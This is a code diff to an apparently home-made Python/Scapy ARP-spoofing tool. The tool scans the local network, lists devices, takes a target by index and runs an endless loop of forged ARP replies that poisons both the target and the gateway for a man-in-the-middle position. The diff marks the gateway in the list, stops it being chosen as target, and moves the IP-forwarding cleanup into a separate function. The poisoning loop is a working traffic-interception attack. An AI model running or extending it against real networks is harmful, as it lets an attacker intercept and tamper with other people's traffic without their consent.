@@ -48,6 +48,7 @@ def scan_network(ip_range: str) -> list[dict]:
     """
     devices_list = []
     timeout = 2
+    interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
     print(f"[*] Scanning local network for: {ip_range} on interface {conf.iface}...\n")
 
     arp_request = ARP(pdst=ip_range)
@@ -63,8 +64,12 @@ def scan_network(ip_range: str) -> list[dict]:
     print(f"[i] | {'IP Address':<20} | MAC Address")
     print("-" * 45)
     for current_index, device in enumerate(devices_list):
-        print(f'[{current_index}] | {device["ip"]:<20} | {device["mac"]}')
-
+        if gateway_ip != device["ip"]:
+            print(f'[{current_index}] | {device["ip"]:<20} | {device["mac"]}')
+        else:
+            display_ip = f'{device["ip"]} [*]'
+            print(f'[{current_index}] | {display_ip:<20} | {device["mac"]}')
+    print("-" * 45)
     print(f'[*] Scan completed, please select a target via index.\n')
 
     return devices_list
@@ -81,11 +86,17 @@ def cli_interface(active_list: list[dict]) -> None:
     if not active_list:
         print("[-] No active devices found. Exiting.")
         return
+
+    interface, local_ip, gateway_ip = conf.route.route("0.0.0.0")
+
     while True:
         try:
             target_index = int(input("> "))
             if 0 <= target_index < len(active_list):
-                break
+                if gateway_ip != (active_list[target_index])["ip"]:
+                    break
+                else:
+                    print('[-] Invalid selection. Cannot choose gateway as target.')
             else:
                 print('[-] Invalid index. Please select a number from the list.')
 
@@ -121,33 +132,45 @@ def initiate_mitm(active_list: list[dict], index: int) -> None:
     own_mac_address = get_if_hwaddr(conf.iface)
     active_interface = conf.iface.name
 
-    try:
-        while True:
-            poison_target = Ether(dst=target_mac) / ARP(
-                op=arp_reply,
-                pdst=target_ip,
-                hwdst=target_mac,
-                psrc=gateway_ip,
-                hwsrc=own_mac_address
-            )
-            sendp(poison_target, iface=active_interface, verbose=False)
+    while True:
+        poison_target = Ether(dst=target_mac) / ARP(
+            op=arp_reply,
+            pdst=target_ip,
+            hwdst=target_mac,
+            psrc=gateway_ip,
+            hwsrc=own_mac_address
+        )
+        sendp(poison_target, iface=active_interface, verbose=False)
 
-            poison_gateway = Ether(dst=gateway_mac) / ARP(
-                op=arp_reply,
-                pdst=gateway_ip,
-                hwdst=gateway_mac,
-                psrc=target_ip,
-                hwsrc=own_mac_address
-            )
-            sendp(poison_gateway, iface=active_interface, verbose=False)
+        poison_gateway = Ether(dst=gateway_mac) / ARP(
+            op=arp_reply,
+            pdst=gateway_ip,
+            hwdst=gateway_mac,
+            psrc=target_ip,
+            hwsrc=own_mac_address
+        )
+        sendp(poison_gateway, iface=active_interface, verbose=False)
 
-            time.sleep(loop_delay)
+        time.sleep(loop_delay)
 
-    except KeyboardInterrupt:
-        print(f'[*] Stopping...')
-        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+
+def cleanup() -> None:
+    """
+    Gracefully terminates the interception state by disabling IP forwarding
+    on the local Linux kernel.
+
+    This ensures the host machine stops routing foreign packets, preventing
+    unintentional data leaks or network black holes after the script exits.
+    This is an idempotent system call; it safely forces the state to '0'
+    regardless of whether forwarding was previously active.
+    """
+    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
 
 
 if __name__ == "__main__":
-    active_network = scan_network(get_ip_range())
-    cli_interface(active_network)
+    try:
+        active_network = scan_network(get_ip_range())
+        cli_interface(active_network)
+    except KeyboardInterrupt:
+        print(f'\n[*] Stopping...')
+        cleanup()
